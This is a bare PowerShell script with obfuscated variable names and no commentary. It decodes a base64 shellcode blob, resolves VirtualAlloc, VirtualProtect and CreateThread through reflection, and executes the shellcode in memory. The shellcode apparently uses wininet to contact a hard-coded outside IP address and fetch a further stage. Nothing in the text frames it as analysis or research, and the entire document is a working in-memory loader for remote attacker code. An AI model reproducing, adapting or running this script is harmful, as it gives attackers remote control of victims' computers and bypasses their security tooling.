function whr {
        Param ($zesWP, $kcfE4)
        $jDh2o = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jDh2o.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jDh2o.GetMethod('GetModuleHandle')).Invoke($null, @($zesWP)))), $kcfE4))
}

function bKb6 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $gl,
                [Parameter(Position = 1)] [Type] $nm = [Void]
        )

        $qo0 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $qo0.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $gl).SetImplementationFlags('Runtime, Managed')
        $qo0.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $nm, $gl).SetImplementationFlags('Runtime, Managed')

        return $qo0.CreateType()
}

[Byte[]]$wBnA0 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAyMTAuMjE1LjEyOS4xMTEAWkiJwUnHwFAAAABNMclTU2oDU0m6V4mfxgAAAAD/1ehzAAAAL2pnLThIalk1Z3RpQ1hZTmY1Z3lVVFF3RXBtNGs4TXZJTThzRnExRDZMamVFR01xeUxUSnJhZDJyc3FRV3MyZzFZRGxVWTA0WGhaZlBJYU0wa0RoODFOblVPTXZIejJVNk5zZGhUME9yWlc1T2lHTjc5AEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$p2g = 0
$vtoO7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((whr kernel32.dll VirtualAlloc), (bKb6 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wBnA0.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($wBnA0, 0, $vtoO7, $wBnA0.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((whr kernel32.dll VirtualProtect), (bKb6 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($vtoO7, [Uint32]$wBnA0.Length, 0x10, [Ref]$p2g)) -eq $true) {
        $mQj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((whr kernel32.dll CreateThread), (bKb6 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vtoO7,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((whr kernel32.dll WaitForSingleObject), (bKb6 @([IntPtr], [Int32]))).Invoke($mQj,0xffffffff) | Out-Null
}
